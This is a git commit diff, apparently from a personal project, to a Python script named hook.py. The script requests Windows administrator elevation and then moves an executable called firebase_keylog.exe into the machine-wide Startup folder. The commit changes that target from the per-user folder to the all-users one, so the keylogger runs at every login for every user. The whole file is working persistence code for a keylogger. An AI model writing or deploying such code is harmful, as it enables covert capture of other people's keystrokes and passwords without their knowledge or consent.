47dc78365681efb91c13540e5babc2e8391ff4a4
alexs2112 <47425839+alexs2112@users.noreply.github.com>
2020-12-02 19:12:23 -0700

    Add files via upload

--- main_ver/hook.py
+++ main_ver/hook.py
@@ -8,20 +8,24 @@ import getpass
 # instructions to ask for admin privileges were taken from this website: 
 # https://stackoverflow.com/questions/41851413/ask-for-admin-access-for-a-python-function-in-windows#42787309
 
+path = os.path.dirname(os.path.abspath(__file__))
+
 # if the user is not admin, ask for admin privileges
+print(path)
 if not ctypes.windll.shell32.IsUserAnAdmin():
     print('Not enough privilege, restarting...')
-    import sys
-    ctypes.windll.shell32.ShellExecuteW(
-        None, 'runas', sys.executable, ' '.join(sys.argv), None, None)
-    exit(0)
+    #ctypes.windll.shell32.ShellExecuteW(
+    #    None, 'runas', sys.executable, ' '.join(sys.argv), None, None)
+    ctypes.windll.shell32.ShellExecuteW(None, u"runas", sys.executable,
+                                        ' '.join(sys.argv), None, 1)
+    sys.exit(0)
 else:
-	print('Elevated privilege acquired')
+    print('Elevated privilege acquired')
 
 # instructions for using shutil were taken from this website: https://www.geeksforgeeks.org/how-to-move-files-and-directories-in-python/
 
 # move the exe file of the keylog into the startup folder
-src = r"dist/firebase_keylog.exe" # this assumes the exe is in dist folder which is in the current working directory
+src = path + "\\dist\\firebase_keylog.exe" # this assumes the exe is in dist folder which is in the current working directory
 user = getpass.getuser()
-dst = r'C:/Users/' + user +'/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup'
+dst = r'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp'
 shutil.move(src, dst)
